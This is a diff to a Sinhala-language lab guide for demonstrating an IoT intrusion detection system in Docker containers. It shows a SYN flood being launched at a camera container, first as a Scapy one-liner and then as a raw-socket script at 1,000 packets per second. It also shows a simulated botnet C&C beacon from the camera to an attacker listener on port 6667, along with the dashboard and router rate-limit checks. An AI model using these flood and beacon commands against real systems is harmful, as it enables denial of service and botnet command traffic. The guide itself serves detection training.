@@ -1839,35 +1839,38 @@ Nmap done: 1 IP address (1 host up) scanned in 0.79 seconds
 
 ---
 
-### ප්‍රහාරය 2: සජීවී DDoS SYN Flood එකක් දියත් කිරීම (Scapy Direct Attack)
+### ප්‍රහාරය 2: සජීවී DDoS SYN Flood එකක් දියත් කිරීම (Raw Socket Flood)
 
 #### 💡 ඇයි මේ දේ කරන්නෙ? (Why We Are Doing This):
-Attacker කෙනෙකු කැමරාව crash කිරීමට අධිවේගී SYN Flood එකක් එවන විට, පද්ධතිය මඟින් එය DDoS ප්‍රහාරයක් ලෙස හඳුනාගන්නා බව පෙන්වීමටය.
+Attacker කෙනෙකු කැමරාව crash කිරීමට අධිවේගී SYN Flood එකක් එවන විට, පද්ධතිය මඟින් එය DDoS ප්‍රහාරයක් ලෙස හඳුනාගෙන Dashboard එකට Real-time Alert එකක් එවන බවත්, Router එක මඟින් attacker ව limit කරන ආකාරයත් සජීවීව පෙන්වීමටය.
 
 #### ⚙️ Command එක run කළ විට සිදුවන්නේ කුමක්ද? (What Happens Under the Hood):
-Python Scapy library එක මඟින් raw TCP SYN packets 50 ක් මිලි තත්පර 10 කට වරක් කැමරාව වෙත අධිවේගයෙන් විදිනු ලැබේ.
+Attacker container එකේ raw TCP sockets (`/lab/syn_flood.py`) මඟින් තත්පරයකට raw TCP SYN packets 1,000 බැගින් තත්පර 5 ක් තුළ මුළු packets 5,000 ක් කැමරාවේ Port 80 වෙත අධිවේගයෙන් විදිනු ලැබේ.
 
 #### 💻 ධාවනය කරන Command එක:
 ```powershell
-docker exec ids-lab-attacker python -c "from scapy.all import IP, TCP, send; send(IP(src='10.10.10.50', dst='192.168.50.30')/TCP(sport=12345, dport=80, flags='S'), count=50, inter=0.01, verbose=False); print('DDoS SYN Flood Sent: 50 Raw SYN Packets')"
+docker exec ids-lab-attack-server python -u /lab/syn_flood.py 192.168.50.30 --port 80 --rate 1000 --seconds 5
 ```
 
 ##### 🔍 කේතයෙන් සිදුවන දේ සරලව (Line-by-Line Breakdown):
-- `from scapy.all import IP, TCP, send`: Python Scapy packet crafting library එක භාවිතා කරන්න.
-- `IP(src='10.10.10.50', dst='192.168.50.30')`: Attacker ගේ සිට කැමරාව වෙත IP packet header එකක් සාදන්න.
-- `TCP(sport=12345, dport=80, flags='S')`: Port 80 වෙත TCP SYN flag එක සහිත packet එකක් සාදන්න.
-- `send(..., count=50, inter=0.01)`: මිලි තත්පර 10 කට වරක් packets 50 ක් අධිවේගයෙන් කැමරාව වෙත විදින්න.
+- `docker exec ids-lab-attack-server`: Attacker ජාලයේ (`10.10.10.50`) පිහිටි attack server container එක භාවිතා කරන්න.
+- `python -u /lab/syn_flood.py 192.168.50.30`: කැමරාව ඉලක්ක කර අධිවේගී raw socket flood script එක ධාවනය කරන්න.
+- `--port 80`: කැමරාවේ HTTP management web interface එක ඉලක්ක කරන්න.
+- `--rate 1000 --seconds 5`: තත්පරයකට packets 1,000 බැගින් තත්පර 5 ක් තුළ මුළු packets 5,000 ක් විදින්න.
 
 ##### 📋 ලැබෙන සැබෑ ප්‍රතිඵලය:
 ```text
-DDoS SYN Flood Sent: 50 Raw SYN Packets
+SYN flood 10.10.10.50 -> 192.168.50.30:80, 1000/s for 5 s
+sent 5001 SYN packets in 5.0 s
 ```
 
 #### 🖥️ Dashboard එකෙන් සජීවීව ඔප්පු කර පෙන්වන ආකාරය:
 1. **Live Alerts පිටුව (`http://localhost:5000/alerts`):**
-   - SYN Flood එක එල්ල වූ සැණින් රතු පැහැති **`DDoS_DoS`** Alert badge එකක් සහ 100.00% confidence අගය සහිතව WebSocket alert එකක් තිරයට push වේ.
+   - SYN Flood එක එල්ල වූ සැණින් රතු පැහැති **`DDoS_DoS`** Alert badge එකක් WebSocket හරහා තිරයට real-time push වේ.
 2. **Overview පිටුව (`http://localhost:5000/overview`):**
    - **"Total Attacks"** කවුන්ටරය සහ **"Rate Limit Events"** ඉහළ යන අයුරු පෙන්වන්න.
+3. **Router Rate Limit පරීක්ෂාව (`ids-lab-router`):**
+   - `docker exec ids-lab-router nft list set inet ids limit_src` run කර Router kernel එක මඟින් `10.10.10.50` ලිපිනය rate-limit කර ඇති අයුරු සජීවීව පෙන්වන්න.
 
 ---
 
@@ -1885,13 +1888,14 @@ docker exec ids-lab-router nft list set inet ids block_dst
 #### පියවර 2: සජීවී C&C Outbound Beaconing එකක් කැමරාවෙන් Attacker වෙත යැවීම:
 ```powershell
 # 1. Attacker Container එකේ Port 6667 Listener එකක් විවෘත කිරීම:
-docker exec -d ids-lab-attacker python -c "import socket; s=socket.socket(); s.bind(('0.0.0.0', 6667)); s.listen(1); s.accept()"
+docker exec -d ids-lab-attack-server python -c "import socket; s=socket.socket(); s.bind(('0.0.0.0', 6667)); s.listen(1); s.accept()"
 
 # 2. ආසාදිත කැමරාවෙන් Attacker වෙත සැබෑ TCP C&C Beacon එකක් යැවීම:
 docker exec ids-lab-camera python -c "import socket; s=socket.socket(); s.connect(('10.10.10.50', 6667)); s.sendall(b'HELO_CNC\n')"
 ```
 
 ##### 🔍 කේතයෙන් සිදුවන දේ සරලව (Line-by-Line Breakdown):
+- `docker exec -d ids-lab-attack-server`: Attacker container එකේ python සේවාව භාවිතා කරන්න.
 - `s.bind(('0.0.0.0', 6667))`: Attacker පරිගණකයේ Port 6667 විවෘත කර Botnet Master Server එකක් ලෙස සවන් දෙන්න.
 - `s.connect(('10.10.10.50', 6667))`: ආසාදිත කැමරාව විසින් router එක හරහා පිටත attacker ගේ Port 6667 වෙත outbound connection එකක් සාදන්න.
 - `s.sendall(b'HELO_CNC\n')`: කැමරාව විසින් botnet check-in beacon packet එක යවන්න.
